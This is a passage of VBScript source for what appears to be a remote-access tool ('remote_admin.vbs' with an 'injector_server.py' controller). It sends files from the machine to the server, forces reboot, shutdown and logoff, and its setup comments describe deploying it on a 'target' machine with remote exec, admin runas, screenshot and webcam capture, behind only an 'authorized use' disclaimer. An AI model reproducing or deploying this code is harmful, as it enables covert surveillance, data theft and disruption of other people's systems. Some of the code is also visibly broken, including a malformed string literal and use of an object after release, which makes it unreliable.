    fileData = adodbStream.ReadText
    adodbStream.Close
    
    Set file = Nothing
    Set fso = Nothing
    Set adodbStream = Nothing
    
    ' Send to server
    SendFile file.Name, fileData
    
    HandleFileDownload = "File downloaded: " & file.Name & " (" & file.Size & " bytes)"
End Function

' ============================================================================
' SYSTEM CONTROL
' ============================================================================

Function RebootSystem()
    Dim wshShell
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.Run "shutdown.exe /r /t 0", 0, False
    
    Set wshShell = Nothing
    RebootSystem = "System reboot initiated"
End Function

Function ShutdownSystem()
    Dim wshShell
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.Run "shutdown.exe /s /t 0", 0, False
    
    Set wshShell = Nothing
    ShutdownSystem = "System shutdown initiated"
End Function

Function LogoffUser()
    Dim wshShell
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.Run "shutdown.exe /l /t 0", 0, False
    
    Set wshShell = Nothing
    LogoffUser = "User logoff initiated"
End Function

' ============================================================================
' UTILITY FUNCTIONS
' ============================================================================

Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FileExists = fso.FileExists(filePath)
    Set fso = Nothing
End Function

Function FolderExists(folderPath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FolderExists = fso.FolderExists(folderPath)
    Set fso = Nothing
End Function

Function CreateFolder(folderPath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    On Error Resume Next
    fso.CreateFolder folderPath
    On Error GoTo 0
    Set fso = Nothing
End Function

Function GetTempDirectory()
    Dim fso, tempPath
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempPath = fso.GetSpecialFolder(2) ' 2 = TemporaryFolder
    
    ' Create injector_temp subdirectory
    tempPath = tempPath & "\" & TEMP_DIR
    
    If Not FolderExists(tempPath) Then
        CreateFolder tempPath
    End If
    
    Set fso = Nothing
    GetTempDirectory = tempPath
End Function

Function FileSize(filePath)
    Dim fso, file
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(filePath) Then
        Set file = fso.GetFile(filePath)
        FileSize = file.Size
        Set file = Nothing
    Else
        FileSize = 0
    End If
    
    Set fso = Nothing
End Function

Function ExtractValue(jsonString, key)
    Dim startPos, endPos, value
    
    ' Simple JSON value extraction
    startPos = InStr(jsonString, """" & key & """: """)
    If startPos = 0 Then
        startPos = InStr(jsonString, """" & key & """:")
        If startPos = 0 Then
            ExtractValue = ""
            Exit Function
        End If
        startPos = startPos + Len(key) + 3 ' Skip past key and colon
    Else
        startPos = startPos + Len(key) + 4 ' Skip past key, colon, and quote
    End If
    
    ' Find the end of the value
    If Mid(jsonString, startPos, 1) = """ Then
        ' String value
        endPos = InStr(startPos + 1, jsonString, """")
        If endPos > startPos Then
            value = Mid(jsonString, startPos + 1, endPos - startPos - 1)
        Else
            value = ""
        End If
    Else
        ' Non-string value (number, boolean, etc.)
        endPos = InStr(startPos, jsonString, ",")
        If endPos = 0 Then endPos = InStr(startPos, jsonString, "}")
        If endPos > startPos Then
            value = Mid(jsonString, startPos, endPos - startPos)
        Else
            value = ""
        End If
    End If
    
    ExtractValue = value
End Function

Function EncodeURIComponent(text)
    ' Simple URL encoding for basic characters
    Dim result, i, charCode
    
    result = ""
    For i = 1 To Len(text)
        charCode = Asc(Mid(text, i, 1))
        
        ' Encode special characters
        Select Case Mid(text, i, 1)
            Case " "
                result = result & "%20"
            Case "!"
                result = result & "%21"
            Case "#"
                result = result & "%23"
            Case "$"
                result = result & "%24"
            Case "&"
                result = result & "%26"
            Case "'"
                result = result & "%27"
            Case "("
                result = result & "%28"
            Case ")"
                result = result & "%29"
            Case "*"
                result = result & "%2A"
            Case "+"
                result = result & "%2B"
            Case ","
                result = result & "%2C"
            Case "/"
                result = result & "%2F"
            Case ":"
                result = result & "%3A"
            Case ";"
                result = result & "%3B"
            Case "="
                result = result & "%3D"
            Case "?"
                result = result & "%3F"
            Case "@"
                result = result & "%40"
            Case "["
                result = result & "%5B"
            Case "]"
                result = result & "%5D"
            Case Else
                result = result & Mid(text, i, 1)
        End Select
    Next
    
    EncodeURIComponent = result
End Function

Function CheckCommandAvailable(command)
    Dim wshShell, result
    
    Set wshShell = CreateObject("WScript.Shell")
    On Error Resume Next
    
    ' Try to run the command with --help or /? to check if it exists
    result = wshShell.Run(command & " --help", 0, True)
    
    If Err.Number = 0 Then
        CheckCommandAvailable = True
    Else
        CheckCommandAvailable = False
    End If
    
    Set wshShell = Nothing
    On Error GoTo 0
End Function

Function CleanupTempFiles()
    Dim fso, folder, file
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If FolderExists(tempDir) Then
        Set folder = fso.GetFolder(tempDir)
        
        ' Delete files older than 1 hour
        For Each file In folder.Files
            If DateDiff("h", file.DateLastModified, Now()) > 1 Then
                On Error Resume Next
                fso.DeleteFile file.Path
                On Error GoTo 0
            End If
        Next
        
        Set folder = Nothing
    End If
    
    Set fso = Nothing
End Function

' ============================================================================
' SETUP INSTRUCTIONS
' ============================================================================
'
' SETUP INSTRUCTIONS:
' ==================
'
' 1. SERVER SETUP:
'    - Save injector_server.py to your server machine
'    - Install Python 3.x if not already installed
'    - Run: python injector_server.py [port]
'    - Default port: 8080
'    - The server will create directories: uploads/, downloads/, screenshots/, webcam/
'
' 2. CLIENT SETUP:
'    - Save remote_admin.vbs to the target Windows machine
'    - Double-click to run or execute: cscript remote_admin.vbs [server_url]
'    - Default server URL: http://localhost:8080
'    - For remote connections: cscript remote_admin.vbs http://your-server-ip:8080
'
' 3. DEPENDENCIES:
'    - For screenshot capture (preferred): Download nircmd.exe from https://www.nirsoft.net/utils/nircmd.html
'      and place it in C:\Windows\ or C:\Windows\System32\
'    - For webcam capture: Install FFmpeg from https://ffmpeg.org/
'    - For PowerShell fallback: Ensure PowerShell is enabled
'
' 4. USAGE:
'    - Start the server: python injector_server.py
'    - Run the client: cscript remote_admin.vbs
'    - Use the interactive menu to send commands to clients
'    - View results, screenshots, and webcam images through the menu
'
' 5. AVAILABLE COMMANDS:
'    - sysinfo: Get system information
'    - processes: List running processes
'    - drives: List available drives
'    - dir [path]: List directory contents
'    - exec [command]: Execute command
'    - runas [command]: Run command as administrator
'    - msg [message]: Send message to user
'    - screenshot: Capture screenshot
'    - webcam: Capture webcam image
'    - reboot: Reboot the system
'    - shutdown: Shutdown the system
'    - logoff: Log off current user
'    - upload_file: Upload file to client
'    - download_file: Download file from client
'
' 6. SECURITY NOTES:
'    - This tool is for AUTHORIZED USE ONLY
'    - Only use on systems you own or have permission to manage
'    - Unauthorized use may violate laws and ethical guidelines
'    - The server does not implement authentication by default
'    - For production use, add authentication and encryption
'
' 7. TROUBLESHOOTING:
'    - If screenshot capture fails, install nircmd.exe
'    - If webcam capture fails, install FFmpeg
'    - Ensure the server URL is accessible from the client
'    - Check firewall settings to allow connections on the specified port
'    - For PowerShell issues, ensure execution policy allows scripts
'
' ============================================================================
